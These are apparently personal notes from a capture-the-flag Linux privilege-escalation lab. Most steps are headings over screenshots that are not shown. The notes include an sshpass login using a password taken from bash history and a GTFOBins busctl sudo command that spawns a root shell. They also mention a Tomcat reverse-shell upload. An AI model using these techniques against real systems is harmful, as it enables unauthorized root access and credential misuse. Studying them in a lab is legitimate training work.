## Flag 1

Found the first flag by simply searching for hidden files:
![[Pasted image 20240613173319.png]]

## Flag 2

### Getting barry's Password with bash history
![[Pasted image 20240613173410.png]]

`sshpass -p 'i_l0ve_s3cur1ty!' ssh barry_adm@dmz1.inlanefreight.local`

### Using the Password to Log in as barry
![[Pasted image 20240613173549.png]]

### Getting the Second Flag
![[Pasted image 20240616100030.png]]

## Flag 3

### Listing Groups
![[Pasted image 20240616101455.png]]

barry is part of the adm group, which means we can read files from the `/var/log` directory.

### Listing the /var/log Directory
![[Pasted image 20240616101607.png]]

### Getting the Third Flag
![[Pasted image 20240616101642.png]]

## Flag 4

After Some Enumeration, got the credentials for the tomcat web app:
![[Pasted image 20240616120806.png]]

### Logging in with the Credentials
![[Pasted image 20240616120913.png]]

### Generating a Reverse Shell File
![[Pasted image 20240616121633.png]]

### Uploading the File
![[Pasted image 20240616121450.png]]

### Starting a Listener
![[Pasted image 20240616121729.png]]

### Going to the Backup Page
![[Pasted image 20240616121837.png]]

### Got a Connection
![[Pasted image 20240616121929.png]]

### Getting the Flag
![[Pasted image 20240616122000.png]]

## Flag 5

### Improving the Shell
![[Pasted image 20240616122137.png]]

### Listing sudo Privileges
![[Pasted image 20240616122347.png]]

Got a root shell running the command from [here](https://gtfobins.github.io/gtfobins/busctl/#sudo):
```shell-session
tomcat@nix03:/home$ sudo busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
```

### Getting the root Flag
![[Pasted image 20240616122531.png]]
